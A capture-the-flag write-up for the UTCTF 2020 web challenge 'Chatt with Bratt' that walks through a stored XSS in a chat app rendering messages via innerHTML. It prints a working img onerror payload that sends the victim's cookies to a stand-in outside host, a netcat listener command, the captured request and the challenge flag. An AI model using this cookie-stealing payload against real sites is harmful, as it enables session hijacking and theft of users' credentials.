# UTCTF 2020 – Chatt with Bratt

* **Category:** web
* **Points:** 50

## Challenge

> After announcing that he would be having an anonymous 1-on-1 AMA with randomly chosen, adoring fans, an engineering team hacked together a web app and likely forget to patch some obvious security holes. Anyway, you're one of the lucky fans chosen to chatt with Bratt Pid! Have fun: web3.utctf.live:8080
> 
> by phleisch

## Solution

The website simulates a chat with a VIP. Analyzing the HTML, some interesting JavaScript code can be found.

```html
	<script>
		function addMessage(content, name) {
			const messageBody = document.getElementById('message-body');
			const card = document.createElement("div");
			card.className = "card";
			const cardHeader = document.createElement("div");
			cardHeader.className = "card-header";
			const strongName = document.createElement("strong");
			strongName.innerHTML = name;
			cardHeader.appendChild(strongName);
			card.appendChild(cardHeader);
			const cardBody = document.createElement("div");
			cardBody.className = "card-body";
			const cardText = document.createElement("p");
			cardText.className = "card-text";
			cardText.innerHTML = content;
			cardBody.appendChild(cardText);
			card.appendChild(cardBody);
			messageBody.appendChild(card);
			return;
		}
	</script>

	<script>
		function showMessages(data) {
			const messageBody = document.getElementById('message-body');
			if (data.Messages.length == messageBody.children.length) {
				return;
			}
			const sortedMessages = data.Messages.sort((a, b) => b.Msg_Sent - a.Msg_Sent)
			messageBody.textContent = '';
			sortedMessages.forEach(message => {
				const name = message.User_ID == 1 ? "Anon" : "Bratt Pid";
				addMessage(message.Content, name);
			});
		}
	</script>
	
	<script>
		function loadMessages() {
			fetch('/messages')
				.then((response) => {
					return response.json();
				})
				.then((data) => {
					showMessages(data);
				});
			setTimeout(loadMessages, 10000);
		}
	</script>

	<script>
	  function sendMessage() {
		const message = document.getElementById('message'); 
		
		if (message.value === "") {
		  return false;
		}

		addMessage(message.value, "Anon");

		const data = {content: message.value}
		fetch('/chatt', {
		  method: 'POST',
		  body: JSON.stringify(data)
		});
		
		message.value = "";
		return true;
	  }
	</script>
```

Peforming some tests, you can discover that chat functionality is vulnerable to HTML tag injection, because the message sent to the server is then reflected into the web page and it is not escaped. An XSS can be performed using the `img` tag and the `onerror` attribute.

Analyzing cookies, an interesting cookie called `secret` can be found, but it is set to `none` value.

A listening server can be set up using *netcat*, e.g. `nc -lkv 1337`.

The following HTTP request can be crafted to attack the chat endpoint and steal cookies of the VIP user.

```
POST /chatt HTTP/1.1
Host: web3.utctf.live:8080
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0
Accept: */*
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: http://web3.utctf.live:8080/chatt
Content-Type: text/plain;charset=UTF-8
Origin: http://web3.utctf.live:8080
Content-Length: 115
Connection: close
Cookie: chat_id=d9ab6df5-6175-11ea-ae82-ee665abdd353; secret=none

{"content":"<img src=\"foo.png\" onerror=\"document.location='http://xxx.xxx.xxx.xxx:1337?c='+document.cookie;\" />"}
```

On the listening server you will find the request sent by the victim browser.

```
Connection from ec2-18-213-193-80.compute-1.amazonaws.com 5015 received!
GET /?c=chat_id=d9ab6df5-6175-11ea-ae82-ee665abdd353;%20secret=utflag{95debad95cfb106081f33ceadc36bf9c} HTTP/1.1
Host: xxx.xxx.xxx.xxx:1337
Connection: keep-alive
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/80.0.3987.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://127.0.0.1:8080/chatt
Accept-Encoding: gzip, deflate
Accept-Language: en-US
```

The `secret` cookie will contain the flag.

```
utflag{95debad95cfb106081f33ceadc36bf9c}
```